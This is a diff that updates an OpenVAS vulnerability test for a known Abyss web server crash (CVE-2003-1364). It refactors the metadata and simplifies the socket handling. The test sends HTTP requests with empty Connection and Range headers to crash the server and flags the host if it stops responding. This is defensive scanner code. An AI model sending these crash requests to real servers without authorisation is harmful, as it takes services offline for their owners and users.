@@ -1,6 +1,8 @@
+###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: abyss_dos.nasl 5390 2017-02-21 18:39:27Z mime $
-# Description: Abyss httpd crash
+# $Id: abyss_dos.nasl 10323 2018-06-26 07:32:48Z cfischer $
+#
+# Abyss httpd crash
 #
 # Authors:
 # Renaud Deraison <deraison@cvs.nessus.org>
@@ -20,16 +22,7 @@
 # You should have received a copy of the GNU General Public License
 # along with this program; if not, write to the Free Software
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
-#
-
-tag_summary = "It was possible to kill the web server by
-sending empty HTTP fields (namely Connection: and Range: ).
-
-An attacker may use this flaw to prevent this host from performing
-its job properly.";
-
-tag_solution = "If the remote web server is Abyss X1, then upgrade to
-Abyss X1 v.1.1.4, otherwise inform your vendor of this flaw.";
+###############################################################################
 
 # References:
 # Date: Sat, 5 Apr 2003 12:21:48 +0000
@@ -40,66 +33,60 @@ Abyss X1 v.1.1.4, otherwise inform your vendor of this flaw.";
 
 if(description)
 {
- script_id(80047);;
- script_version("$Revision: 5390 $");
- script_tag(name:"last_modification", value:"$Date: 2017-02-21 19:39:27 +0100 (Tue, 21 Feb 2017) $");
- script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
- script_cve_id("CVE-2003-1364");
- script_bugtraq_id(7287);
- script_xref(name:"OSVDB", value:"2226");
- script_tag(name:"cvss_base", value:"8.5");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:C");
- name = "Abyss httpd crash";
- script_name(name);
- 
- 
- script_category(ACT_DENIAL);
+  script_oid("1.3.6.1.4.1.25623.1.0.80047");
+  script_version("$Revision: 10323 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-06-26 09:32:48 +0200 (Tue, 26 Jun 2018) $");
+  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
+  script_cve_id("CVE-2003-1364");
+  script_bugtraq_id(7287);
+  script_xref(name:"OSVDB", value:"2226");
+  script_tag(name:"cvss_base", value:"8.5");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:C");
+  script_name("Abyss httpd crash");
+  script_category(ACT_DENIAL);
+  script_copyright("This script is Copyright (C) 2003 Renaud Deraison");
+  script_family("Denial of Service");
+  script_dependencies("find_service1.nasl", "no404.nasl", "gb_get_http_banner.nasl");
+  script_require_ports("Services/www", 80);
+  script_mandatory_keys("Abyss/banner");
+
+  script_tag(name:"solution", value:"If the remote web server is Abyss X1, then upgrade to Abyss X1 v.1.1.4,
+  otherwise inform your vendor of this flaw.");
+
+  script_tag(name:"summary", value:"It was possible to kill the web server by sending empty HTTP fields(namely
+  Connection: and Range: ).");
+
+  script_tag(name:"impact", value:"An attacker may use this flaw to prevent this host from performing its job properly.");
+
   script_tag(name:"qod_type", value:"remote_vul");
- 
- script_copyright("This script is Copyright (C) 2003 Renaud Deraison");
- family = "Denial of Service";
- script_family(family);
- script_dependencies("find_service1.nasl", "no404.nasl", "gb_get_http_banner.nasl");
- script_require_ports("Services/www", 80);
- script_mandatory_keys("Abyss/banner");
- script_tag(name : "solution" , value : tag_solution);
- script_tag(name : "summary" , value : tag_summary);
- exit(0);
+  script_tag(name:"solution_type", value:"VendorFix");
+
+  exit(0);
 }
-
-########
-
 
 include("http_func.inc");
 
 port = get_http_port(default:80);
-
-if(! get_port_state(port)) exit(0);
 banner = get_http_banner(port:port);
 if ( ! banner || "Abyss/" >!< banner ) exit(0);
-
 if(http_is_dead(port:port))exit(0);
 
-req = string("GET / HTTP/1.0\r\n", "Host: ", get_host_name(), "\r\n", "Connection: \r\n\r\n");
-soc = http_open_socket(port);
-if(! soc) exit(0);
+host = http_host_name(port:port);
 
-send(socket:soc, data: req);
-r = http_recv(socket:soc);
-http_close_socket(soc);
+req = string("GET / HTTP/1.0\r\n", "Host: ", host, "\r\n", "Connection: \r\n\r\n");
+http_send_recv(port: port, data: req);
 
+if(http_is_dead(port: port)) {
+  security_message(port: port);
+  exit(0);
+}
 
+req = string("GET / HTTP/1.0\r\n", "Host: ", host, "\r\n", "Range: \r\n\r\n");
+http_send_recv(port: port, data: req);
 
-if(http_is_dead(port: port)) { security_message(port); }
+if(http_is_dead(port: port)) {
+  security_message(port: port);
+  exit(0);
+}
 
-
-
-req = string("GET / HTTP/1.0\r\n", "Host: ", get_host_name(), "\r\n", "Range: \r\n\r\n");
-soc = http_open_socket(port);
-if(! soc) exit(0);
-
-send(socket:soc, data: req);
-r = http_recv(socket:soc);
-http_close_socket(soc);
-
-if(http_is_dead(port: port)) { security_message(port); }
+exit(99);
